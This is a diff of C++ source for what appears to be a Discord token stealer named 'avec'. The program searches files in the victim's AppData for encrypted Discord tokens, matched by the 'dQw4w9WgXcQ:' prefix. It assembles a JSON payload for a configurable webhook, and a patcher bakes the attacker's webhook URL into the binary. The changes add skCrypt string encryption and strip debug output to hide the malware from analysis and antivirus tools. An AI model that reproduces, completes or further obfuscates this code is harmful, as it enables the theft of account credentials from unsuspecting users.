@@ -45,14 +45,14 @@ int main(int argc, char** argv) {
 			std::string executable(argv[i]);
 
 			executable = executable.substr(executable.find_last_of("\\") + 1);
-			if (executable.starts_with("patched_")) {
-				if(std::filesystem::exists("avec.exe")) 
-					std::filesystem::remove("avec.exe");
+			if (executable.starts_with(skCrypt("patched_"))) {
+				if(std::filesystem::exists(skCrypt("avec.exe").decrypt()))
+					std::filesystem::remove(skCrypt("avec.exe").decrypt());
 
 				Sleep(500);
-				std::filesystem::rename(executable, "avec.exe");
+				std::filesystem::rename(executable, skCrypt("avec.exe").decrypt());
 
-				MessageBoxA(nullptr, "Finished patching...", "avec", MB_OK | MB_ICONINFORMATION);
+				MessageBoxA(nullptr, skCrypt("Finished patching..."), skCrypt("avec"), MB_OK | MB_ICONINFORMATION);
 				return 0;
 			}
 		}
@@ -75,11 +75,11 @@ int main(int argc, char** argv) {
 			std::ifstream webhookFile(argv[i]);
 			
 			std::getline(webhookFile, text);
-			std::cout << text << std::endl;
+			//std::cout << text << std::endl;
 			
 			Patcher* p = new Patcher(executable);
 			if (!p->Patch(text)) {
-				std::cout << "Couldn't patch this executable. Please try again. (0x" << std::hex << GetLastError() << ")" << std::dec << std::endl;
+				std::cout << skCrypt("Couldn't patch this executable. Please try again. (0x") << std::hex << GetLastError() << ")" << std::dec << std::endl;
 				Sleep(5000);
 				return 1;
 			}
@@ -98,7 +98,6 @@ int main(int argc, char** argv) {
 			return 0;
 		}
 	}
-	printf("started\n");
 
 	PWSTR szAppdata;
 	SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &szAppdata);
@@ -185,19 +184,19 @@ int main(int argc, char** argv) {
 		i++;
 	}
 
-	body.append(R"(]
+	body.append(skCrypt(R"(]
 		}
 	  ],
 	  "attachments": []
-	})");
+	})"));
 
 	std::string webhook = WEBHOOK_URL.decrypt();
 
-	if (!webhook.compare("EXAMPLE_HOOK")) { // NOT SET BY COMPILER
+	if (!webhook.compare(skCrypt("EXAMPLE_HOOK"))) { // NOT SET BY COMPILER
 		webhook = resources::ReadResource();
 
-		if (!webhook.compare("EXAMPLE")) {
-			MessageBoxA(nullptr, "No webhook was set!", "avec", MB_OK | MB_ICONERROR);
+		if (!webhook.compare(skCrypt("EXAMPLE"))) {
+			MessageBoxA(nullptr, skCrypt("No webhook was set!"), skCrypt("avec"), MB_OK | MB_ICONERROR);
 		}
 	}
 
@@ -219,7 +218,7 @@ void Thread(void* data) {
 
 	std::ifstream file(s, std::ios::binary);
 	if (!file) {
-		std::cerr << "Failed to open file: " << s << std::endl;
+		std::cerr << skCrypt("Failed to open file: ") << s << std::endl;
 		return;
 	}
 
@@ -227,7 +226,7 @@ void Thread(void* data) {
 	buffer << file.rdbuf();
 	std::string keyFile = buffer.str();
 
-	std::regex pattern(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\""]*)");
+	std::regex pattern(skCrypt(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\""]*)"));
 	std::smatch match;
 
 	if (std::regex_search(keyFile, match, pattern)) {
